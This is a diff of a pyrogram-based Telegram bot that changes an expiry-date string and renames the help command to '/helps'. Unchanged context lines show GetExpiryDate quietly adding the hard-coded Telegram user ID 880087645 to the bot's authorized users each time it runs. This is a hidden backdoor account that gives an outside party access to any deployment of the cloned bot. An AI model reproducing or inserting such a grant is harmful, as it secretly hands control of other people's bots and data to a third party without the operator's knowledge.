@@ -37,15 +37,15 @@ myfather = 'https://t.me/JAsuran123'.format(Config.USER_NAME[1:])
 from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
-    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
+    expires_at = (str(chat_id), "Source Cloned User", "2021.12.31.12.00.00")
     Config.AUTH_USERS.add(880087645)
     return expires_at
 
 
-@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
+@pyrogram.Client.on_message(pyrogram.Filters.command(["helps"]))
 async def help_user(bot, update):
     # logger.info(update)
-    TRChatBase(update.from_user.id, update.text, "/help")
+    TRChatBase(update.from_user.id, update.text, "/helps")
     await bot.send_message(
         chat_id=update.chat.id,
         text=Translation.HELP_USER.format(update.from_user.first_name, Config.USER_NAME[1:]),
